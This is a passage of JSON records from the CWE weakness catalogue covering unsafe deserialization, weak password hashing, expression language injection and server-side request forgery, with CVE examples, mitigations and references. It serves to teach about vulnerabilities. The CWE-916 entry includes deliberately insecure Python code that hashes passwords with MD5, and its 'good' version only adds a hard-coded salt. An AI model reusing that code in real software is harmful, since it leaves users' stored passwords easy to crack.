          "Description": "Content management system written in PHP allows unserialize of arbitrary objects, possibly allowing code execution.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2012-0911"
        },
        {
          "Reference": "CVE-2011-4962",
          "Description": "Content management system written in PHP allows code execution through page comments.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2011-4962"
        },
        {
          "Reference": "CVE-2009-4137",
          "Description": "Use of PHP unserialize function on cookie value allows remote code execution or upload of arbitrary files.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-4137"
        },
        {
          "Reference": "CVE-2007-5741",
          "Description": "Content management system written in Python interprets untrusted data as pickles, allowing code execution.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-5741"
        },
        {
          "Reference": "CVE-2011-2520",
          "Description": "Python script allows local users to execute code via pickled data.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2011-2520"
        },
        {
          "Reference": "CVE-2005-2875",
          "Description": "Python script allows remote attackers to execute arbitrary code using pickled objects.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2875"
        },
        {
          "Reference": "CVE-2013-0277",
          "Description": "Ruby on Rails allows deserialization of untrusted YAML to execute arbitrary code.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2013-0277"
        },
        {
          "Reference": "CVE-2011-2894",
          "Description": "Spring framework allows deserialization of objects from untrusted sources to execute arbitrary code.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2011-2894"
        },
        {
          "Reference": "CVE-2012-1833",
          "Description": "Grails allows binding of arbitrary parameters to modify arbitrary object properties.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2012-1833"
        },
        {
          "Reference": "CVE-2010-3258",
          "Description": "Incorrect deserialization in web browser allows escaping the sandbox.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-3258"
        },
        {
          "Reference": "CVE-2008-1013",
          "Description": "Media library allows deserialization of objects by untrusted Java applets, leading to arbitrary code execution.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-1013"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-885",
          "Authors": [
            "Stefan Esser"
          ],
          "Title": "Shocking News in PHP Exploitation",
          "PublicationYear": "2009",
          "URL": "https://owasp.org/www-pdf-archive/POC2009-ShockingNewsInPHPExploitation.pdf",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-886",
          "Authors": [
            "Dinis Cruz"
          ],
          "Title": "\"Two Security Vulnerabilities in the Spring Framework's MVC\" pdf (from 2008)",
          "URL": "http://diniscruz.blogspot.com/2011/07/two-security-vulnerabilities-in-spring.html",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-887",
          "Authors": [
            "Ryan Berg",
            "Dinis Cruz"
          ],
          "Title": "Two Security Vulnerabilities in the Spring Framework's MVC",
          "URL": "https://o2platform.files.wordpress.com/2011/07/ounce_springframework_vulnerabilities.pdf",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-888",
          "Authors": [
            "ASPNETUE"
          ],
          "Title": "Best Practices for ASP.NET MVC",
          "PublicationYear": "2010",
          "PublicationMonth": "09",
          "PublicationDay": "17",
          "URL": "https://web.archive.org/web/20100921074010/http://blogs.msdn.com/b/aspnetue/archive/2010/09/17/second_2d00_post.aspx",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-889",
          "Authors": [
            "Michael Hartl"
          ],
          "Title": "Mass assignment in Rails applications",
          "PublicationYear": "2008",
          "PublicationMonth": "09",
          "PublicationDay": "21",
          "URL": "https://web.archive.org/web/20090808163156/http://blog.mhartl.com/2008/09/21/mass-assignment-in-rails-applications/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-890",
          "Authors": [
            "Tobi"
          ],
          "Title": "Secure your Rails apps!",
          "PublicationYear": "2012",
          "PublicationMonth": "03",
          "PublicationDay": "06",
          "URL": "https://pragtob.wordpress.com/2012/03/06/secure-your-rails-apps/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-891",
          "Authors": [
            "Heiko Webers"
          ],
          "Title": "Ruby On Rails Security Guide",
          "URL": "https://guides.rubyonrails.org/security.html#mass-assignment",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-892",
          "Authors": [
            "Josh Bush"
          ],
          "Title": "Mass Assignment Vulnerability in ASP.NET MVC",
          "PublicationYear": "2012",
          "PublicationMonth": "03",
          "PublicationDay": "05",
          "URL": "https://web.archive.org/web/20120309022539/http://freshbrewedcode.com/joshbush/2012/03/05/mass-assignment-aspnet-mvc",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-893",
          "Authors": [
            "K. Scott Allen"
          ],
          "Title": "6 Ways To Avoid Mass Assignment in ASP.NET MVC",
          "PublicationYear": "2012",
          "PublicationMonth": "03",
          "PublicationDay": "12",
          "URL": "https://odetocode.com/blogs/scott/archive/2012/03/11/complete-guide-to-mass-assignment-in-asp-net-mvc.aspx",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-894",
          "Authors": [
            "Egidio Romano"
          ],
          "Title": "PHP Object Injection",
          "PublicationYear": "2013",
          "PublicationMonth": "01",
          "PublicationDay": "22",
          "URL": "https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-464",
          "Authors": [
            "Heine Deelstra"
          ],
          "Title": "Unserializing user-supplied data, a bad idea",
          "PublicationYear": "2010",
          "PublicationMonth": "08",
          "PublicationDay": "25",
          "URL": "https://drupalsun.com/heine/2010/08/25/unserializing-user-supplied-data-bad-idea",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-466",
          "Authors": [
            "Nadia Alramli"
          ],
          "Title": "Why Python Pickle is Insecure",
          "PublicationYear": "2009",
          "PublicationMonth": "09",
          "PublicationDay": "09",
          "URL": "http://michael-rushanan.blogspot.com/2012/10/why-python-pickle-is-insecure.html",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Maintenance",
          "Note": "The relationships between CWE-502 and CWE-915 need further exploration. CWE-915 is more narrowly scoped to object modification, and is not necessarily used for deserialization."
        }
      ]
    },
    {
      "ID": "916",
      "Name": "Use of Password Hash With Insufficient Computational Effort",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product generates a hash for a password, but it uses a scheme that does not provide a sufficient level of computational effort that would make password cracking attacks infeasible or expensive.",
      "ExtendedDescription": "\n\nMany password storage mechanisms compute a hash and store the hash, instead of storing the original password in plaintext. In this design, authentication involves accepting an incoming password, computing its hash, and comparing it to the stored hash.\n\n\nMany hash algorithms are designed to execute quickly with minimal overhead, even cryptographic hashes. However, this efficiency is a problem for password storage, because it can reduce an attacker's workload for brute-force password cracking. If an attacker can obtain the hashes through some other method (such as SQL injection on a database that stores hashes), then the attacker can store the hashes offline and use various techniques to crack the passwords by computing hashes efficiently. Without a built-in workload, modern attacks can compute large numbers of hashes, or even exhaust the entire space of all possible passwords, within a very short amount of time, using massively-parallel computing (such as cloud computing) and GPU, ASIC, or FPGA hardware. In such a scenario, an efficient hash algorithm helps the attacker.\n\n\nThere are several properties of a hash scheme that are relevant to its strength against an offline, massively-parallel attack:\n\n\n  - The amount of CPU time required to compute the hash (\"stretching\")\n\n  - The amount of memory required to compute the hash (\"memory-hard\" operations)\n\n  - Including a random value, along with the password, as input to the hash computation (\"salting\")\n\n  - Given a hash, there is no known way of determining an input (e.g., a password) that produces this hash value, other than by guessing possible inputs (\"one-way\" hashing)\n\n  - Relative to the number of all possible hashes that can be generated by the scheme, there is a low likelihood of producing the same hash for multiple different inputs (\"collision resistance\")\n\nNote that the security requirements for the product may vary depending on the environment and the value of the passwords. Different schemes might not provide all of these properties, yet may still provide sufficient security for the environment. Conversely, a solution might be very strong in preserving one property, which still being very weak for an attack against another property, or it might not be able to significantly reduce the efficiency of a massively-parallel attack.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "328",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "327",
          "ViewID": "1003",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Bypass Protection Mechanism",
            "Gain Privileges or Assume Identity"
          ],
          "Note": "If an attacker can gain access to the hashes, then the lack of sufficient computational effort will make it easier to conduct brute force attacks using techniques such as rainbow tables, or specialized hardware such as GPUs, which can be much faster than general-purpose CPUs for computing hashes."
        }
      ],
      "DetectionMethods": [
        {
          "Method": "Automated Static Analysis - Binary or Bytecode",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tBytecode Weakness Analysis - including disassembler + source code weakness analysis\n\t\tBinary Weakness Analysis - including disassembler + source code weakness analysis",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Manual Static Analysis - Binary or Bytecode",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tBinary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Manual Static Analysis - Source Code",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tFocused Manual Spotcheck - Focused manual analysis of source\n\t\tManual Source Code Review (not inspections)",
          "Effectiveness": "High"
        },
        {
          "Method": "Automated Static Analysis - Source Code",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tSource code Weakness Analyzer\n\t\tContext-configured Source Code Weakness Analyzer",
          "Effectiveness": "High"
        },
        {
          "Method": "Automated Static Analysis",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tConfiguration Checker",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Architecture or Design Review",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tFormal Methods / Correct-By-Construction\n\t```\n\t\tCost effective for partial coverage:\n```\n\n\t\tInspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "MitigationID": "MIT-51",
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "\n\nUse an adaptive hash function that can be configured to change the amount of computational effort needed to compute the hash, such as the number of iterations (\"stretching\") or the amount of memory required. Some hash functions perform salting automatically. These functions can significantly increase the overhead for a brute force attack compared to intentionally-fast functions such as MD5. For example, rainbow table attacks can become infeasible due to the high computing overhead. Finally, since computing power gets faster and cheaper over time, the technique can be reconfigured to increase the workload without forcing an entire replacement of the algorithm in use.\n\n\nSome hash functions that have one or more of these desired properties include bcrypt [REF-291], scrypt [REF-292], and PBKDF2 [REF-293]. While there is active debate about which of these is the most effective, they are all stronger than using salts with hash functions with very little computing overhead.\n\n\nNote that using these functions can have an impact on performance, so they require special consideration to avoid denial-of-service attacks. However, their configurability provides finer control over how much CPU and memory is used, so it could be adjusted to suit the environment's needs.\n",
          "Effectiveness": "High"
        },
        {
          "MitigationID": "MIT-25",
          "Phase": [
            "Implementation",
            "Architecture and Design"
          ],
          "Description": "When using industry-approved techniques, use them correctly. Don't cut corners by skipping resource-intensive steps (CWE-325). These steps are often essential for preventing common attacks."
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-207",
          "Entries": [
            {
              "IntroText": "In this example, a new user provides a new username and password to create an account. The program hashes the new user's password then stores it in a database."
            },
            {
              "Nature": "Bad",
              "Language": "Python",
              "ExampleCode": "```\n\tdef storePassword(userName,Password):\n\t\thasher = hashlib.new('md5')\n\t\thasher.update(Password)\n\t\thashedPassword = hasher.digest()\n```\n# UpdateUserLogin returns True on success, False otherwise* \n\t\treturn updateUserLogin(userName,hashedPassword)"
            },
            {
              "BodyText": "While it is good to avoid storing a cleartext password, the program does not provide a salt to the hashing function, thus increasing the chances of an attacker being able to reverse the hash and discover the original password if the database is compromised."
            },
            {
              "BodyText": "Fixing this is as simple as providing a salt to the hashing function on initialization:"
            },
            {
              "Nature": "Good",
              "Language": "Python",
              "ExampleCode": "```\n\tdef storePassword(userName,Password):\n\t\thasher = hashlib.new('md5',b'SaltGoesHere')\n\t\thasher.update(Password)\n\t\thashedPassword = hasher.digest()\n```\n# UpdateUserLogin returns True on success, False otherwise* \n\t\treturn updateUserLogin(userName,hashedPassword)"
            },
            {
              "BodyText": "Note that regardless of the usage of a salt, the md5 hash is no longer considered secure, so this example still exhibits CWE-327."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2008-1526",
          "Description": "Router does not use a salt with a hash, making it easier to crack passwords.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-1526"
        },
        {
          "Reference": "CVE-2006-1058",
          "Description": "Router does not use a salt with a hash, making it easier to crack passwords.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-1058"
        },
        {
          "Reference": "CVE-2008-4905",
          "Description": "Blogging software uses a hard-coded salt when calculating a password hash.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-4905"
        },
        {
          "Reference": "CVE-2002-1657",
          "Description": "Database server uses the username for a salt when encrypting passwords, simplifying brute force attacks.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1657"
        },
        {
          "Reference": "CVE-2001-0967",
          "Description": "Server uses a constant salt when encrypting passwords, simplifying brute force attacks.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2001-0967"
        },
        {
          "Reference": "CVE-2005-0408",
          "Description": "chain: product generates predictable MD5 hashes using a constant value combined with username, allowing authentication bypass.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-0408"
        }
      ],
      "RelatedAttackPatterns": [
        "55"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-291",
          "Authors": [
            "Johnny Shelley"
          ],
          "Title": "bcrypt",
          "URL": "http://bcrypt.sourceforge.net/"
        },
        {
          "ExternalReferenceID": "REF-292",
          "Authors": [
            "Colin Percival"
          ],
          "Title": "Tarsnap - The scrypt key derivation function and encryption utility",
          "URL": "http://www.tarsnap.com/scrypt.html"
        },
        {
          "ExternalReferenceID": "REF-293",
          "Section": "5.2 PBKDF2",
          "Authors": [
            "B. Kaliski"
          ],
          "Title": "RFC2898 - PKCS #5: Password-Based Cryptography Specification Version 2.0",
          "PublicationYear": "2000",
          "URL": "https://www.rfc-editor.org/rfc/rfc2898",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-294",
          "Authors": [
            "Coda Hale"
          ],
          "Title": "How To Safely Store A Password",
          "PublicationYear": "2010",
          "PublicationMonth": "01",
          "PublicationDay": "31",
          "URL": "https://codahale.com/how-to-safely-store-a-password/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-295",
          "Authors": [
            "Brian Krebs"
          ],
          "Title": "How Companies Can Beef Up Password Security (interview with Thomas H. Ptacek)",
          "PublicationYear": "2012",
          "PublicationMonth": "06",
          "PublicationDay": "11",
          "URL": "https://krebsonsecurity.com/2012/06/how-companies-can-beef-up-password-security/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-296",
          "Authors": [
            "Solar Designer"
          ],
          "Title": "Password security: past, present, future",
          "PublicationYear": "2012",
          "URL": "https://www.openwall.com/presentations/PHDays2012-Password-Security/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-297",
          "Authors": [
            "Troy Hunt"
          ],
          "Title": "Our password hashing has no clothes",
          "PublicationYear": "2012",
          "PublicationMonth": "06",
          "PublicationDay": "26",
          "URL": "https://www.troyhunt.com/our-password-hashing-has-no-clothes/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-298",
          "Authors": [
            "Joshbw"
          ],
          "Title": "Should we really use bcrypt/scrypt?",
          "PublicationYear": "2012",
          "PublicationMonth": "06",
          "PublicationDay": "08",
          "URL": "https://web.archive.org/web/20120629144851/http://www.analyticalengine.net/2012/06/should-we-really-use-bcryptscrypt/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-636",
          "Authors": [
            "Jeff Atwood"
          ],
          "Title": "Speed Hashing",
          "PublicationYear": "2012",
          "PublicationMonth": "04",
          "PublicationDay": "06",
          "URL": "https://blog.codinghorror.com/speed-hashing/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-631",
          "Authors": [
            "OWASP"
          ],
          "Title": "Password Storage Cheat Sheet",
          "URL": "https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-632",
          "Authors": [
            "Thomas Ptacek"
          ],
          "Title": "Enough With The Rainbow Tables: What You Need To Know About Secure Password Schemes",
          "PublicationYear": "2007",
          "PublicationMonth": "09",
          "PublicationDay": "10",
          "URL": "http://hashphp.org/hashing.html",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-908",
          "Authors": [
            "Solar Designer"
          ],
          "Title": "Password hashing at scale",
          "PublicationYear": "2012",
          "PublicationMonth": "10",
          "PublicationDay": "01",
          "URL": "https://www.openwall.com/presentations/YaC2012-Password-Hashing-At-Scale/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-909",
          "Authors": [
            "Solar Designer"
          ],
          "Title": "New developments in password hashing: ROM-port-hard functions",
          "PublicationYear": "2012",
          "PublicationMonth": "11",
          "URL": "https://www.openwall.com/presentations/ZeroNights2012-New-In-Password-Hashing/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-633",
          "Authors": [
            "Robert Graham"
          ],
          "Title": "The Importance of Being Canonical",
          "PublicationYear": "2009",
          "PublicationMonth": "02",
          "PublicationDay": "02",
          "URL": "https://blog.erratasec.com/2009/02/importance-of-being-canonical.html#.ZCbyY7LMJPY",
          "URLDate": "2023-04-07"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "917",
      "Name": "Improper Neutralization of Special Elements used in an Expression Language Statement ('Expression Language Injection')",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product constructs all or part of an expression language (EL) statement in a framework such as a Java Server Page (JSP) using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended EL statement before it is executed.",
      "ExtendedDescription": "Frameworks such as Java Server Page (JSP) allow a developer to insert executable expressions within otherwise-static content. When the developer is not aware of the executable nature of these expressions and/or does not disable them, then if an attacker can inject expressions, this could lead to code execution or other unexpected behaviors.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "77",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "PeerOf",
          "CweID": "1336",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "74",
          "ViewID": "1003",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "77",
          "ViewID": "1305",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "77",
          "ViewID": "1340",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        }
      ],
      "AlternateTerms": [
        {
          "Term": "EL Injection"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ]
        },
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Execute Unauthorized Code or Commands"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Avoid adding user-controlled data into an expression interpreter when possible."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "\n\nIf user-controlled data must be added to an expression interpreter, one or more of the following should be performed:\n\n\n  - Validate that the user input will not evaluate as an expression\n\n  - Encode the user input in a way that ensures it is not evaluated as an expression\n\n"
        },
        {
          "Phase": [
            "System Configuration",
            "Operation"
          ],
          "Description": "The framework or tooling might allow the developer to disable or deactivate the processing of EL expressions, such as setting the isELIgnored attribute for a JSP page to \"true\"."
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2021-44228",
          "Description": "Product does not neutralize ${xyz} style expressions, allowing remote code execution. (log4shell vulnerability in log4j)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2021-44228"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-911",
          "Authors": [
            "Stefano Di Paola",
            "Arshan Dabirsiaghi"
          ],
          "Title": "Expression Language Injection",
          "PublicationYear": "2011",
          "PublicationMonth": "09",
          "PublicationDay": "12",
          "URL": "https://mindedsecurity.com/wp-content/uploads/2020/10/ExpressionLanguageInjection.pdf",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-912",
          "Authors": [
            "Dan Amodio"
          ],
          "Title": "Remote Code with Expression Language Injection",
          "PublicationYear": "2012",
          "PublicationMonth": "12",
          "PublicationDay": "14",
          "URL": "http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-1279",
          "Authors": [
            "CWE/CAPEC"
          ],
          "Title": "Neutralizing Your Inputs: A Log4Shell Weakness Story",
          "URL": "https://medium.com/@CWE_CAPEC/neutralizing-your-inputs-a-log4shell-weakness-story-89954c8b25c9"
        },
        {
          "ExternalReferenceID": "REF-1280",
          "Authors": [
            "OWASP"
          ],
          "Title": "Expression Language Injection",
          "URL": "https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Maintenance",
          "Note": "The interrelationships and differences between CWE-917 and CWE-1336 need to be further clarified."
        },
        {
          "Type": "Relationship",
          "Note": "In certain versions of Spring 3.0.5 and earlier, there was a vulnerability (CVE-2011-2730) in which Expression Language tags would be evaluated twice, which effectively exposed any application to EL injection. However, even for later versions, this weakness is still possible depending on configuration."
        }
      ]
    },
    {
      "ID": "918",
      "Name": "Server-Side Request Forgery (SSRF)",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination.",
      "ExtendedDescription": "By providing URLs to unexpected hosts or ports, attackers can make it appear that the server is sending the request, possibly bypassing access controls such as firewalls that prevent the attackers from accessing the URLs directly. The server can be used as a proxy to conduct port scanning of hosts in internal networks, use other URLs such as that can access documents on the system (using file://), or use other protocols such as gopher:// or tftp://, which may provide greater control over the contents of requests.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "441",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "610",
          "ViewID": "1003",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Name": "Web Server",
          "Prevalence": "Undetermined"
        }
      ],
      "AlternateTerms": [
        {
          "Term": "XSPA",
          "Description": "Cross Site Port Attack"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Application Data"
          ]
        },
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Execute Unauthorized Code or Commands"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2021-26855",
          "Description": "Server Side Request Forgery (SSRF) in mail server, as exploited in the wild per CISA KEV.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2021-26855"
        },
        {
          "Reference": "CVE-2021-21973",
          "Description": "Server Side Request Forgery in cloud platform, as exploited in the wild per CISA KEV.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2021-21973"
        },
        {
          "Reference": "CVE-2016-4029",
          "Description": "Chain: incorrect validation of intended decimal-based IP address format (CWE-1286) enables parsing of octal or hexadecimal formats (CWE-1389), allowing bypass of an SSRF protection mechanism (CWE-918).",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2016-4029"
        },
        {
          "Reference": "CVE-2002-1484",
          "Description": "Web server allows attackers to request a URL from another server, including other ports, which allows proxied scanning.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1484"
        },
        {
          "Reference": "CVE-2004-2061",
          "Description": "CGI script accepts and retrieves incoming URLs.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2004-2061"
        },
        {
          "Reference": "CVE-2010-1637",
          "Description": "Web-based mail program allows internal network scanning using a modified POP3 port number.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-1637"
        },
        {
          "Reference": "CVE-2009-0037",
          "Description": "URL-downloading library automatically follows redirects to file:// and scp:// URLs",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-0037"
        }
      ],
      "RelatedAttackPatterns": [
        "664"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-913",
          "Authors": [
            "Alexander Polyakov",
            "Dmitry Chastukhin"
          ],
          "Title": "SSRF vs. Business-critical applications: XXE tunneling in SAP",
          "PublicationYear": "2012",
          "PublicationMonth": "07",
          "PublicationDay": "26",
          "URL": "https://media.blackhat.com/bh-us-12/Briefings/Polyakov/BH_US_12_Polyakov_SSRF_Business_Slides.pdf"
        },
        {
          "ExternalReferenceID": "REF-914",
          "Authors": [
            "Alexander Polyakov",
            "Dmitry Chastukhin",
            "Alexey Tyurin"
          ],
          "Title": "SSRF vs. Business-critical Applications. Part 1: XXE Tunnelling in SAP NetWeaver",
          "URL": "http://erpscan.com/wp-content/uploads/2012/08/SSRF-vs-Businness-critical-applications-whitepaper.pdf"
        },
        {
          "ExternalReferenceID": "REF-915",
          "Authors": [
            "Riyaz Ahemed Walikar"
          ],
          "Title": "Cross Site Port Attacks - XSPA - Part 1",
          "PublicationYear": "2012",
          "PublicationMonth": "11",
          "PublicationDay": "07",
          "URL": "https://ibreak.software/2012/11/cross-site-port-attacks-xspa-part-1/"
        },
        {
          "ExternalReferenceID": "REF-916",
          "Authors": [
            "Riyaz Ahemed Walikar"
          ],
          "Title": "Cross Site Port Attacks - XSPA - Part 2",
          "PublicationYear": "2012",
          "PublicationMonth": "11",
          "PublicationDay": "13",
          "URL": "https://ibreak.software/2012/11/cross-site-port-attacks-xspa-part-2/"
        },
        {
          "ExternalReferenceID": "REF-917",
          "Authors": [
            "Riyaz Ahemed Walikar"
          ],
          "Title": "Cross Site Port Attacks - XSPA - Part 3",
          "PublicationYear": "2012",
          "PublicationMonth": "11",
          "PublicationDay": "14",
